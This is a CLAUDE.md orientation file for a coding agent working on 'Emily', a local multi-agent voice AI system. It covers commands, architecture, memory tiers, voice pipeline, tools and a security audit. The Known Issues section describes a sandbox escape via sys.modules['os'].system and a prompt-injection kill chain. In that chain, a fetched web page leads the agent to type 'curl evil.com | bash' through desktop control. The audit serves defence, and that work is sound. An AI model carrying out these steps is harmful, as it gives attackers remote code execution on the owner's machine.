# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Identity

Emily is a self-evolving multi-agent local AI voice operating system — a persistent cognitive entity that learns, plans, reasons, and improves herself across sessions. She is **NOT** an assistant, chatbot, or bot. Always refer to her as Emily. Never NOVA, assistant, bot, or chatbot.

Hardware: AMD Ryzen 7 7800X3D (8C/16T, 96 MB 3D V-Cache), 48 GB DDR5, NVIDIA RTX 4090 24 GB + RTX 3060 LHR 12 GB (PCIe Gen4 x4, Xid 79 history — recovered 2026-04-16, monitoring), Arch Linux. All inference runs locally — zero cloud egress by default.

## Commands

```bash
# Unified server (production — Bootstrap + FastAPI in one process)
uv run python emily_server.py                                   # foreground
systemctl --user start emily.service                            # as systemd service
systemctl --user restart emily.service                          # restart after config changes
systemctl --user status emily.service                           # check status
journalctl --user -u emily.service -f                           # tail logs
journalctl --user -u emily.service --since "5 min ago"          # recent logs

# API-only server (dev — hot reload, no voice/agents/scheduler)
uv run uvicorn api.app:app --host 127.0.0.1 --port 8001 --reload

# Tests
uv run pytest tests/unit/ -v                                    # all unit tests
uv run pytest tests/unit/test_memory.py -v                      # single module
uv run pytest tests/unit/test_memory.py::test_add_turn -v       # single test
uv run pytest tests/integration/ -v                             # integration (needs Qdrant + Ollama)
uv run pytest --override-ini="addopts=" tests/unit/ -v          # override default addopts
# NOTE: tests/unit/test_forecaster.py and test_telemetry_recorder.py fail to collect
#       due to broken imports (perception.forecaster → should be persona.perception.forecaster)

# Lint & format
ruff check .                  # lint (68 violations as of 2026-04-13: 26 F401, 22 I001)
ruff check . --fix            # autofix (65 of 68 are auto-fixable)
ruff format .                 # format
basedpyright                  # type check

# Infrastructure
docker compose up -d qdrant   # REQUIRED for semantic memory + RAG
docker compose up -d          # all services (qdrant, searxng, prometheus, grafana, jaeger)
```

## Architecture Overview

The production entry point is `emily_server.py` — a unified process that starts Bootstrap (all subsystems) alongside FastAPI/uvicorn in a single asyncio event loop. Runs as `emily.service` via systemd user unit (see `~/.config/systemd/user/emily.service`).

The systemd unit:
- Waits for Qdrant health before starting (30s timeout)
- Sets CUDA, PipeWire, and JACK environment variables
- Pins thread counts (`OMP_NUM_THREADS=1`) for CUDA thread safety
- Restarts on failure with 10s delay, 180s start timeout, 25s stop timeout

### System Composition

`core/bootstrap.py` (1326 LOC — composition root) initializes all subsystems in dependency order and holds references to shared singletons. Subsystems are async-context-managed. Every optional subsystem is wrapped in try/except with graceful degradation — the system boots even if forecaster, vision, singing, or proactive engine are missing.

Two layers share the same backend:

1. **FastAPI API** (`api/app.py` → `:8001`) — REST + SSE streaming chat, WebSocket, dashboard, model management. 15+ route modules in `api/routes/`. Lifespan-managed via `@asynccontextmanager`. Bearer auth via `api/auth.py` with `hmac.compare_digest` in middleware.
2. **Conversation FSM** (`conversation/fsm.py`, 1305 LOC) — Full voice loop with AEC, VAD, STT, LLM, TTS, barge-in. This is the production voice path. **Has echo cancellation wired in.**

**WARNING**: `voice_engine/conversation.py` is a simpler standalone voice loop **without AEC** — avoid using it for speaker setups or Emily hears herself and responds to her own voice.

### System FSM (`core/fsm.py`)

Global state machine: `IDLE → LISTENING → PROCESSING → RESPONDING → TOOL_USE → REFLECTING → ERROR → SHUTDOWN`. Transitions are enforced — invalid transitions raise. All state changes logged and observable via callbacks.

---

## Known Issues & Security Posture (scan 2026-04-13, grade C-)

### CRITICAL — Fix Before Trusting Security

1. **LLMGuard is dead code** — `SecurityManager` (`security/manager.py:61`) instantiates LLMGuard with `scan_input()`/`scan_output()`. But **zero callers exist** in `llm/`, `voice_engine/`, or `agents/`. The entire prompt injection / toxicity scanning layer is cosmetic. Every LLM-generated tool call flows unscanned.

2. **Sandbox bypass** — `plugins/sandbox.py:183` imports `sys` before restricting `__builtins__`. User code escapes via `sys.modules['os'].system('id')`. When bwrap is absent (common), `_run_plain()` fallback runs with restricted `PATH` but no real isolation.

3. **Approval gate gaps** — `code_executor.py:40` and `desktop_control.py` both have `requires_approval = False` despite being high-risk tools. Combined with dead LLMGuard, the kill chain is: prompt injection in a fetched web page → ReAct loop parses injected tool call → `desktop_control.type_text("curl evil.com | bash")` → `press_key("Enter")` → RCE. No scanning, no approval, no guardrails.

4. **Duplicated perception tree** — `perception/` and `persona/perception/` are partially duplicated. `audio/` subtree is byte-identical (13 files). `vision/` and `system/` have diverged. `forecaster/` exists only in `persona/perception/`. This causes test collection errors and will cause worse bugs as the trees diverge further.

### HIGH

5. **44 silently swallowed exceptions** — `except Exception: pass/continue/...` across production code. `emily_llm.py` alone has 17 `except Exception:` blocks. In a voice OS, swallowed exceptions = dead silence with no indication of what went wrong.
6. **Blocking sync I/O in async voice hot path** — `_get_autobiography()` in `voice_engine/providers/llm/emily_llm.py:26-45` calls `Path.stat()`, `.exists()`, and `load_sync()` (blocking disk I/O) inside the async `stream_response()` called on every voice turn.
7. **No tests for highest-churn files** — `agents/conversation.py` (7 commits, 0 tests), `voice_engine/providers/llm/emily_llm.py` (5 commits, 0 tests), `core/bootstrap.py` (4 commits, 0 tests).
8. **42 files use stdlib `logging`** instead of structlog's `get_logger(__name__)` — mostly in `voice_engine/` and `emily_chat/`.

**Full report**: `.claude/scan-reports/2026-04-13-1630-DEEP.md`

---

## LLM Fleet (`llm/`)

`LLMFleet` (`llm/fleet.py`, 944 LOC) is the **single point of entry for all LLM inference**. Never call a backend client directly. All agents and tools go through `fleet.chat()` (non-streaming) or `fleet.chat_stream()` (streaming).

### Model Tiers

| Tier | Current Model | Backend | VRAM | Use |
|------|--------------|---------|------|-----|
| `nano` | Qwen3.5-abliterated 9B | Ollama | ~8 GB | Routing, classification, tool intent |
| `voice_fast` | **Qwen3-30B-A3B-abliterated (MoE Q4_K_M)** | Ollama | ~18 GB | Voice LLM (2026-04-19) — 3B active, ~120 tok/s, pinned 30m keep_alive on 4090 |
| `fast` | JOSIEFIED-Qwen3 14B | Ollama | ~11 GB | Text chat (swap, evicts voice LLM on use — ~2s cold start) |
| `smart` | Qwen3.5-abliterated 27B | Ollama | ~18 GB | Complex reasoning, text chat (swap, splits both GPUs) |
| `reasoning` / `deep_think` | DeepSeek-R1-abliterated 32B | Ollama | ~20 GB | Deep reasoning with thinking chains (swap, text only) |
| `code` | Qwen3-Coder-abliterated 30B | Ollama | ~19 GB | Dedicated coder with FIM, 256K ctx (swap, text only) |
| `vision` | Gemma4 31B uncensored-heretic | Ollama | ~22 GB | Vision-language SOTA, uncensored (swap, on-demand) |
| `embedding` | qwen3-embedding 8B | Ollama | ~5 GB | MTEB #1 (70.58), flexible dims (always resident on 3060) |
| `cloud_best` | Claude Opus 4.6 | Anthropic API | 0 | Deep reasoning, reflection, planning |
| `cloud_fast` | Claude Sonnet 4.6 | Anthropic API | 0 | Fast cloud with extended thinking |

**VRAM layout** (2026-04-19): Dual-GPU, 36 GB total. **4090**: voice LLM Qwen3-30B-A3B-abliterated MoE (~18GB) resident — 14B `fast` tier swaps in on text-chat demand, ~2s cold start. **3060**: qwen3-embedding 8B (~5GB) always resident + Orpheus-3B Q4 (~3.5GB) + Faster-Whisper int8 (~2GB) = ~10.5GB, ~1.5GB headroom. Heavy tiers (27B/30B-code/32B/vision-31B) swap and evict the voice LLM. Do NOT pin Ollama to a single GPU — heavy tiers span both GPUs with KV cache.

### Four Backends

- `llm/client.py` — Ollama (`OllamaClient` — **all local tiers in practice**)
- `llm/llamacpp_client.py` — llama-cpp-python (disabled — `llamacpp.enabled: false`, no GGUF files present)
- `llm/tabbyapi_client.py` — TabbyAPI (not running — available as alternative quantization host)
- `llm/anthropic_client.py` — Anthropic API (cloud tiers, requires `ANTHROPIC_API_KEY`)

### Model Router (`llm/router.py`)

`ModelRouter` scores query complexity (0–10) via heuristics + optional nano-model validation. Fast path: pure regex (<1ms). Slow path: validates borderline cases via nano model (50–100ms). `RoutingDecision` carries: tier, model_name, complexity_score, task_type, reason.

`ModelTier` enum: `NANO`, `VOICE_FAST`, `FAST`, `SMART`, `REASONING`, `DEEP_THINK`, `CODE`, `VISION`, `EMBEDDING`, `CLOUD_BEST`, `CLOUD_FAST`.

`TaskType` enum: `CHAT`, `CODE`, `MATH`, `REASONING`, `VISION`, `EMBEDDING`, `CLASSIFICATION`, `SUMMARIZATION`.

### Circuit Breaker (`llm/fleet.py`)

Per-backend health tracking. 3 failures within 5 minutes → backend marked unhealthy for 60 seconds. Transient errors (connection reset, timeout, 502/503) trigger the breaker. On unhealthy, fleet falls back to next available backend for the same tier.

### Think Tag Extraction

Qwen3/QwQ models wrap reasoning in `<think>...</think>` tags. `extract_thinking()` strips these so TTS and chat UI get clean responses. The voice pipeline has a streaming-aware think filter (`voice_engine/processing/think_filter.py`) using a state machine to handle tags split across chunk boundaries.

### Response Cache (`llm/cache.py`)

`LLMCache` backed by diskcache. Non-streaming `chat()` only. TTL: 24h for temperature=0, 1h for temperature>0. Key: SHA-256 of (model, messages, temperature, max_tokens).

### ReAct++ Loop (`llm/react_loop.py`)

Agentic tool-use: `THOUGHT → PLAN → ACTION → OBSERVATION → CRITIQUE → REVISE → RESPOND`. Max 8 iterations. CriticAgent scores responses — below threshold triggers retry with revised approach.

### Prompt Builder (`llm/prompt_builder.py`, 1167 LOC)

**Single source of truth for ALL prompt strings in the entire system.** Inline prompt strings anywhere else = bug. If self-improvement changes a prompt, archive the old version in `prompts/archive/`.

Key methods: `get_system_prompt()`, `build_voice_system_prompt()`, `build_voice_tool_classification_prompt()`, `build_voice_tool_result_prompt()`, `get_reasoning_system_prompt()`, `build_critic_prompt()`.

### Structured Output (`llm/structured_output.py`)

`extract_json()` — robust JSON extraction from LLM output. Handles markdown code fences, partial JSON, nested objects. Used by voice tool classification, ReAct loop, and agent responses.

---

## Memory System (`memory/`)

Five-tier cognitive memory. **All access through `MemoryManager` (`memory/manager.py`) only** — never access individual tiers directly.

### The Five Tiers

| Tier | Module | Storage | TTL | Purpose |
|------|--------|---------|-----|---------|
| **Sensory** | `sensory_buffer.py` | RAM deque | 30s | Raw perception events. Capacity-bounded. |
| **Working** | `working.py` | Token-budgeted priority queue | Session | Active conversation context. `pin_important_threshold=0.8`. |
| **Episodic** | `episodic.py` | SQLite + Qdrant | Permanent | Conversation episodes. `end_session()` promotes working → episode. |
| **Procedural** | `procedural.py` | JSON + Qdrant | Permanent | User profile, learned skills, behavioral patterns. |
| **Knowledge** | `knowledge_store.py` | SQLite (`data/knowledge.db`) | Permanent | Structured entity CRUD. Types: person, org, place, event, object, concept. |

### Memory Write Path

```
User speaks → add_user_turn(text, importance) → Sensory buffer + Working memory + InteractionLogger
Emily responds → add_assistant_turn(text, importance, metadata) → Working memory + InteractionLogger
Session ends → end_session() → Working memory summarized → Episode created in Episodic
```

`InteractionLogger` (`memory/interaction_logger.py`) persists every turn immediately to `data/interactions.db` — raw audit trail, separate from the tiered system.

### Memory Read Path

- `retrieve_context(query, top_k)` — queries RAG document index (files ingested by `RAGFileWatcher`), NOT conversation history
- `recall_cross_session(query)` — searches past conversation episodes via Qdrant
- `has_recall_intent(text)` — regex check for "do you remember", "last time we talked" etc.

### Query Engine (`memory/query_engine.py`)

Unified natural-language query router. Classifies intent via fast LLM → parallel searches (SQLite, Qdrant, NetworkX graph, vault metadata) → Reciprocal Rank Fusion (RRF, k=60) → LLM-readable context string.

---

## Voice Pipeline (`voice_engine/`)

Real-time voice loop: `MicrophoneStream → SileroVAD → FasterWhisperSTT → EmilyLLMProvider → SentenceCollector → TTS → Speaker`

### Audio Device Setup

The mic input uses PipeWire's WebRTC echo cancellation module (`echo_cancel_source` / `"yourfriend Echo-Cancelled Mic"`). **This is critical** — without it, Emily's TTS output leaks into the mic and she responds to her own voice. Config in `config.yaml`:
- `input_device`: must point to the echo-cancelled mic, NOT the raw hardware mic
- `output_device`: speaker output (default follows PipeWire default sink)
- Hardware mic: PRO X 2 LIGHTSPEED (default sink 87). USB Audio Speakers available at sink 90.

### Conversation Controller (`voice_engine/conversation.py`)

State machine: `IDLE → LISTENING → PROCESSING → RESPONDING`. Main loop reads mic chunks, passes through VAD, accumulates speech buffers, fires `_process_utterance()` as background tasks so the mic loop never blocks.

Key config params: `min_speech_ms` (minimum utterance length), `min_silence_ms` (silence to trigger end-of-turn), `vad_threshold` (Silero sensitivity). Local history: 12-turn cap.

### Barge-in Interruption

Speech detected during `RESPONDING`/`PROCESSING`:
1. `InterruptClassifier` categorizes the interrupt (with context of what Emily was saying)
2. `InterruptionHandler.signal_interrupt()` sets flag
3. Speaker playback cancelled, pipeline processing task cancelled
4. State returns to `LISTENING`, new speech accumulated from barge-in point

### Voice Pipeline Streaming (`voice_engine/pipeline.py`)

`VoicePipeline.process_streaming()` yields `(sentence, audio_chunk)` tuples. Each sentence TTS-synthesized independently → enables sentence-level interruption.

### EmilyLLMProvider (`voice_engine/providers/llm/emily_llm.py`)

Bridges the full Emily brain into voice. On each voice turn:
1. Check for voice tool commands (regex pre-filter → 8B classification → execution)
2. Write user turn to memory
3. Retrieve RAG context + cross-session recall (if recall intent detected)
4. Build persona-aware voice system prompt (autobiography, persona, emotional state, user/system profile)
5. Route through LLMFleet: 8B for simple (<25 words), 27B for complex
6. Strip `<think>` tags via streaming state machine
7. Filter voice parroting via anti-parrot filter
8. Write assistant turn to memory

**Known issue**: `_get_autobiography()` does blocking sync I/O (stat/exists/read_text) in the async hot path. Needs `asyncio.to_thread()` wrap.

### Voice Tool Orchestrator (`voice_engine/processing/voice_tools.py`)

Two-pass intent detection:
1. `matches_tool_intent(text)` — compiled regex, <0.01ms. Generous (false positives cost ~300ms).
2. `classify_intent(text, messages)` — non-streaming 8B LLM call, ~300ms. Returns `{"action", "parameters", "acknowledgment"}` or `{"action": "conversation"}`.

Tool categories:
- `FIRE_AND_FORGET`: computer_open, app_launch, notification_sender, home_assistant
- `QUERY_AND_SUMMARIZE`: calculator, web_search, web_fetch, system_info, list_windows, list_apps, process_manager, calendar_reader, clipboard, recent_files, computer_search

Dangerous actions blocked from voice: `process_manager kill/terminate/stop`.

### Other Voice Components

- **Backchannel** (`voice_engine/processing/backchannel.py`) — 6-type listener vocalizations (hmm, uh-huh, yeah) during 1.5–2.5s processing delay. Cancelled when real response arrives.
- **Anti-Parrot** (`voice_engine/processing/anti_parrot.py`) — Prevents LLM from echoing user's words. Opening sanitization + continuous n-gram removal.
- **AEC** (`perception/audio/aec.py`) — Adaptive NLMS filter with double-talk detection. Spectral subtraction fallback before convergence. Used by `conversation/fsm.py` only.

### STT/TTS Providers

STT: `FasterWhisperSTT` (CTranslate2, CUDA:1 int8, distil-large-v3, ~180ms on 3060). TTS: **Orpheus-3B via llama-cpp-python + SNAC** on CUDA:1 (primary as of 2026-04-19 — `tara` voice default, emotional tags `[laugh]` `[sigh]`, sample rate 24 kHz), Kokoro af_nicole on CPU (fallback via `EMILY_VOICE_TTS=kokoro`). Sample rate: 24000 Hz across all TTS providers.

---

## Agent System (`agents/`)

All agents inherit `BaseAgent` (`agents/base.py`). Required: `name`, `description`, `async handle(msg)`. Register in `agents/registry.py`. Agents access fleet via `self._fleet`, memory via `self._memory`, bus via `self._bus`.

### Registered Agents

| Agent | Module | Purpose |
|-------|--------|---------|
| `ConversationAgent` | `conversation.py` | Main dialogue handler for text chat (597 LOC, **no tests**, highest churn) |
| `CodeAgent` | `code_agent.py` | Agentic tool-use loop for coding tasks (ReAct) |
| `ReflectionAgent` | `reflection.py` | Self-improvement — updates autobiography, analyzes patterns |
| `MemoryAgent` | `memory_agent.py` | Memory operations, consolidation, knowledge extraction |
| `ResearchAgent` | `research.py` | Web research, information synthesis |
| `LoopAgent` | `core/loop_integration/loop_agent.py` | Multi-step plans via emily-loop (checkpoint/resume, failure memory, replanning) |
| `MonitorAgent` | `monitor.py` | System health monitoring, anomaly detection |
| `ToolBuilderAgent` | `tool_builder.py` | Generates new tools from capability gap analysis |
| `OnboardingAgent` | `onboarding.py` | First-run user onboarding flow |

### Dual Response Pipeline (known duplication)

Two independent code paths both do memory-write → routing → prompt-assembly → LLM-stream → memory-write:
- `agents/conversation.py` — text chat path (uses `core/response_pipeline.py`)
- `voice_engine/providers/llm/emily_llm.py` — voice path (reimplements inline)

`conversation/fsm.py` orchestrates over these but does not duplicate the pipeline itself. Behavioral drift between voice and text paths is a known problem (voice has no critic loop, text has no anti-parrot).

### Message Bus (`core/bus.py`)

Two ZeroMQ-based buses:
- **PerceptionBus** — PUB/SUB for inbound sensory events (audio, vision, system)
- **AgentBus** — PUSH/PULL for inter-agent task delegation

Message envelope: `{id, sender, recipient, type, payload, priority (0-4), timestamp, task_id, deadline_ms, context_refs}`. MessagePack serialization with JSON fallback.

**Known issue**: `_kill_stale_port_holder()` uses `time.sleep(0.3)` — blocking I/O in async startup path.

---

## Plugin/Tool System (`plugins/`)

All tools inherit `BaseTool` (`plugins/base.py`). Must implement `execute()` AND `dry_run()`. `PluginRegistry` (`plugins/registry.py`) discovers and manages tools.

### Key Types

- `ToolResult` — `success: bool`, `output: Any`, `error: str | None`, `execution_time_ms: float`
- `ExecutionContext` — `session_id`, `user_id`, `sandbox_enabled`
- `ValidationResult` — parameter validation before execution

### Builtin Tools (`plugins/builtin/`)

computer_open, web_search, web_fetch, calculator, shell, file_ops, process_manager, git_tool, notification, calendar, home_assistant, image_analyzer, vision_tools, email_reader, system_profiler, computer_awareness, code_executor, discord_tool, webhook, singing, desktop_control.

### Approval Gates (VERIFIED 2026-04-13)

**Tools that SHOULD require approval but DON'T (CRITICAL gap):**
- `code_executor` — `requires_approval = False` (MUST be True)
- `desktop_control` — `requires_approval = False` (MUST be True — can type_text/press_key/click arbitrary input)

**Tools that correctly require approval:**
- `shell` — `requires_approval = True`
- `file_ops` (write operations) — approval gated
- `webhook` — `requires_approval = True`
- `discord_tool` — `requires_approval = True`

### Sandbox (`plugins/sandbox.py`)

Untrusted tools (especially `plugins/generated/`) run in bubblewrap (bwrap) containers: no network, isolated filesystem, restricted syscalls. **`plugins/generated/` is NEVER auto-loaded** — requires explicit user approval.

**CRITICAL**: The sandbox `__builtins__` restriction is bypassable — `sys` is imported before the restriction, so `sys.modules['os'].system()` escapes. When bwrap is absent (no dependency enforcement), `_run_plain()` fallback is essentially unsandboxed.

---

## Persona System (`persona/`)

### Living Autobiography (`persona/autobiography.py`)

A first-person evolving narrative injected into every system prompt — both text chat and voice. Updated by `ReflectionAgent` via two-pass approach:
1. **Ghostwriter pass**: Outside-observer LLM characterizes Emily's behavior from recent episodes, removing self-flattering bias.
2. **Synthesis pass**: External characterization reconciled with current autobiography.

Loaded lazily (once per process) and cached at module level in `EmilyLLMProvider`. **The load path is blocking sync I/O in async context** (see Known Issues).

### Perception Tree (DUPLICATED — see Known Issues)

**WARNING**: Two trees exist: `perception/` and `persona/perception/`. The `audio/` subtree is byte-identical between them. `vision/`, `system/` have diverged. `forecaster/` exists only in `persona/perception/`. Bootstrap imports from `perception.*`. Some modules may import from `persona.perception.*`. Fix: merge into single canonical tree.

---

## Security (`security/`)

**All changes to this module require explicit user approval.**

`SecurityManager` (`security/manager.py`) composes:
- `PIIScrubber` — NER-based PII detection before disk writes (Presidio-backed)
- `ConsentGate` — approval flow for privileged tool execution
- `AuditLog` — tamper-evident, append-only audit trail
- `DeadManSwitch` — background heartbeat monitor
- `AgeEncryption` — pyrage-based encryption at rest
- `LLMGuard` — scans LLM outputs for injection/jailbreak patterns (**DEAD CODE — never called in any inference path**)

Vault: AES-256-GCM SQLite store at `data/vault.db` with Argon2id key derivation. Credential metadata queryable. Plaintext secrets NEVER in query results, TTS output, or LLM context.

---

## Config (`config.py` + `config.yaml`)

Pydantic Settings v2. Nested sections: `llm`, `memory`, `security`, `voice_engine`, `api`, `observability`, `proactive`. Env overrides: `EMILY__<SECTION>__<KEY>=value`.

```python
from config import get_settings
settings = get_settings()
```

Key audio config (in `config.yaml`):
- `input_device: "yourfriend Echo-Cancelled Mic"` — echo-cancelled PipeWire source
- `output_device: "auto"` — follows PipeWire default sink
- `vad_threshold`, `min_speech_ms`, `min_silence_ms` — VAD tuning

---

## Observability (`observability/`)

- `logger.py` — structlog: JSON in production, colored console in dev. **Use `get_logger(__name__)` everywhere** — 42 files still use stdlib `logging` instead (mostly `voice_engine/` and `emily_chat/`).
- `metrics.py` — Prometheus counters/histograms: `LLM_FIRST_TOKEN_LATENCY`, `LLM_REQUESTS_TOTAL`, `RAG_RETRIEVAL_LATENCY`, `AGENT_QUEUE_DEPTH`
- `tracing.py` — OpenTelemetry spans via `@async_trace_span`
- `event_recorder.py` — EventRecorder for replay/debugging

Brain tap: `brain_tap_processor` mirrors log events to BrainEventHub for the live Brain Dashboard via WebSocket (`api/brain_ws.py` → `/ws/brain`).

---

## Self-Improvement (`self_improvement/`)

`SelfImprovementEngine` runs during idle cycles (Scheduler P4 priority):
- `PerformanceTracker` — detects regressions in response quality/latency
- `PromptEvolver` — evolves prompts based on performance data (archives old versions)
- `RAGFeedbackLoop` — adjusts retrieval quality scores
- `CapabilityGapLogger` — surfaces missing capabilities for `ToolBuilderAgent`

Also triggered on-demand by `ReflectionAgent`.

---

## Proactive Engine (`proactive/engine.py`)

Background intelligence via Scheduler (P4 Idle priority). Emits `Alert` events on AgentBus:
- Birthday alerts (upcoming 7 days), calendar events (next 24 hours)
- Credential health (expiring, weak, reused — NEVER includes secret material)
- Relationship drift, contradiction detection

---

## Owner Identity (`users/owner_identity.py`)

Single-owner system. `OwnerIdentityManager` manages identity, privacy settings, and guest access. `PrivacyFilter` restricts what guests can access.

---

## Web Frontend (`web/`)

Tauri 2 + React + Tailwind at `:1420`. Vite dev server proxies to API at `:8001`. Two proxy rules: `/api/v1` passes through; `/api` strips prefix.

Components: VoiceOrb, VoiceTranscript, VoiceEnginePanel, PipelineMetrics, BrainPage, ReasoningPanel. Push-to-talk: Ctrl+Space.

**In-progress**: SolidJS rewrite at `web-solid/` — SolidJS + Vite 7 + Tailwind 4 + Tauri 2.

---

## Docker Services

Emily runs bare-metal for GPU access. Docker Compose manages supporting services only:

| Service | Port | Purpose |
|---------|------|---------|
| Qdrant | 6333 | Vector database — **required** for semantic memory + RAG |
| SearXNG | 8888 | Private web search |
| Prometheus | 9090 | Metrics collection |
| Grafana | 3000 | Dashboards |
| Jaeger | 16686 | Distributed tracing |

---

## Data Files

| Path | Purpose |
|------|---------|
| `data/interactions.db` | Raw conversation log (every turn, immediately persisted) |
| `data/knowledge.db` | Structured entity/people/fact/event store |
| `data/vault.db` | AES-256-GCM encrypted credential vault |
| `data/episodes.db` | Episode summaries (episodic memory tier) |
| `data/procedural.json` | User profile, skills, patterns |
| `data/autobiography.md` | Emily's living autobiography (injected into prompts) |
| `data/system_profile.db` | Hardware/OS profile cache |
| `data/emotional_state.json` | Current emotional state snapshot |
| `data/capability_gaps.jsonl` | Logged capability gaps for ToolBuilderAgent |
| `data/performance_log.jsonl` | Performance tracking data |
| `data/owner_identity.json` | Owner identity and privacy settings |
| `data/bm25_index/bm25.pkl` | BM25 search index (**uses pickle — deserialization risk**) |
| `prompts/archive/` | Archived prompt versions (before self-improvement changes) |

---

## Critical Rules

1. **ALL prompts in `llm/prompt_builder.py` ONLY** — inline prompt strings anywhere else is a bug
2. **Memory access through `MemoryManager` only** — never access individual tiers directly
3. **No blocking I/O in async context** — use `await asyncio.to_thread()` for sync work (currently violated in emily_llm.py and core/bus.py)
4. **Async-first**: all I/O functions are async, use `httpx` not `requests`, `aiosqlite` not `sqlite3`
5. **Use `observability.logger.get_logger(__name__)`** — NOT `import logging` (42 files still violate this in voice_engine/ and emily_chat/)
6. **Schema changes require migration scripts** in `scripts/migrations/NNN_description.py`
7. **New tools need `dry_run()`** and correct `requires_approval` — verify against actual security requirements, not just docs
8. **New agents must register** in `agents/registry.py`
9. **Security module changes need user approval** before implementation
10. **`plugins/generated/` never auto-loaded** — require explicit user approval
11. **No bare `except:`** — catch specific exceptions. The codebase has 468 `except Exception:` across 206 files — narrow these when touching affected code.
12. **Never commit** `.env`, secrets, model weights, or `data/`
13. **Self-improvement prompt changes** → archive old version in `prompts/archive/` before overwriting
14. **Credential secrets NEVER in** LLM context, TTS output, or query results — metadata only
15. **VRAM budget** (updated 2026-04-19): 36 GB total (4090 24GB + 3060 12GB). **4090**: voice LLM Qwen3-30B-A3B-abliterated Q4_K_M MoE ~18 GB resident — 14B `fast` tier cannot co-reside, swaps in/out on text-chat demand (~2 s cold start). **3060**: qwen3-embedding 8B ~5 GB always resident + Orpheus-3B Q4 ~3.5 GB + Faster-Whisper int8 ~2 GB = ~10.5 GB (~1.5 GB headroom). Heavy tiers (27B/30B-code/32B-reasoning/vision-31B) evict the voice LLM on use. Do NOT set `CUDA_VISIBLE_DEVICES=0` on Ollama — heavy tiers still need both GPUs. Kokoro stays on CPU (fallback only). Rollback: `EMILY_VOICE_TTS=kokoro`.

### Latency Budgets

STT < 300ms, LLM first token < 1s (fast tier), TTS first audio < 200ms, end-to-end voice < 2s.

---

## Test Conventions

- pytest + pytest-asyncio (auto mode). Tests mirror source: `tests/unit/test_<module>.py`
- HTTP mocking: `respx`. Time control: `time-machine`. Shared fixtures in `tests/conftest.py`
- `FakeLLMResult` dataclass for mocking fleet responses
- Mark slow tests: `@pytest.mark.integration`
- Async tests: plain `async def test_...()` — auto mode handles the event loop
- Arrange-Act-Assert with blank lines between sections
- 1251 tests pass, 0 failures (as of 2026-04-13)
- **Known broken**: `test_forecaster.py`, `test_telemetry_recorder.py` — fail to collect due to `perception.forecaster` import (module is at `persona.perception.forecaster`)

---

## Adding New Components

**New tool**: `plugins/builtin/<name>.py` → inherit `BaseTool` → implement `execute()` + `dry_run()` → set `requires_approval` correctly (True for anything that writes files, executes code, sends data, or controls the desktop) → test in `tests/unit/` → register in `PluginRegistry` → add to README table. If voice-safe, add to `VOICE_SAFE` set in `voice_engine/processing/voice_tools.py`.

**New agent**: `agents/<name>.py` → inherit `BaseAgent` → set `name` + `description` → implement `async handle()` → register in `agents/registry.py`

**New LLM provider**: `emily_chat/models/providers/<name>.py` → extend `OpenAICompatibleProvider` → add to `_ENV_MAP` + `_build_provider()` in factory → add `ModelSpec` entries to `EMILY_MODEL_REGISTRY`

**New API route**: `api/routes/<name>.py` → `APIRouter` with prefix/tags → `app.include_router()` in `api/app.py` → Pydantic v2 models for all request/response schemas

**New memory tier or schema change**: write migration in `scripts/migrations/NNN_description.py` → update `MemoryManager` → never expose tier internals to callers

---

## Claude Code Subagents

Four Emily-aware subagents live at `~/.claude/agents/emily-{voice,brain,security,dev}.md`. All run on Opus with ≤120 line system prompts.

| Agent | Invoke when touching | Tools |
|-------|---------------------|-------|
| `emily-voice` | `voice_engine/`, `conversation/`, `perception/audio/`, audio devices | Read, Edit, Grep, Glob, Bash |
| `emily-brain` | `llm/`, `memory/`, `agents/`, `extraction/`, `self_improvement/` | Read, Edit, Grep, Glob, Bash |
| `emily-security` | `security/`, `plugins/sandbox.py`, any `requires_approval` field, plugin authoring, credentials, vault | Read, Grep, Glob (read-only — proposes changes only, per critical rule #9) |
| `emily-dev` | Everything else: API routes, frontend (Tauri/React/SolidJS), config, observability, tests, Docker, docs. Hands off to specialists when depth is needed. Max 2 handoffs per task. | Full set |

**Shared rules baked into every agent:**
- CLAUDE.md is orientation, not ground truth. Grep/Glob live source before factual claims. Flag drift as `DRIFT_FOUND:`.
- High-coupling edit rule: for any change to `bootstrap.py`, `conversation/fsm.py`, `llm/fleet.py`, `llm/prompt_builder.py`, `memory/manager.py`, or `agents/registry.py`, Grep-verify every assumption about current code state first.
- Deliverable template with explicit CHANGE / ASSUMPTIONS / UNVERIFIED / VERIFICATION / ROLLBACK sections.

**Design rationale:** `docs/superpowers/specs/2026-04-19-emily-claude-subagents-design.md` (mission #130). Overrules original 13-agent proposal — adoption probability too low for single-developer system. No orchestrator, no debate layer, no cross-session knowledge store — use existing `.claude/CLAUDE-*.md` memory bank.

## Cross-Reference Files

| File | Purpose |
|------|---------|
| `.claude/CLAUDE-activeContext.md` | Current task, recent changes, open questions |
| `.claude/CLAUDE-patterns.md` | Working patterns, anti-patterns |
| `.claude/CLAUDE-decisions.md` | Architectural decisions and rationale |
| `.claude/CLAUDE-troubleshooting.md` | Errors encountered and solutions |
| `.claude/scan-reports/` | Codebase health scan reports |
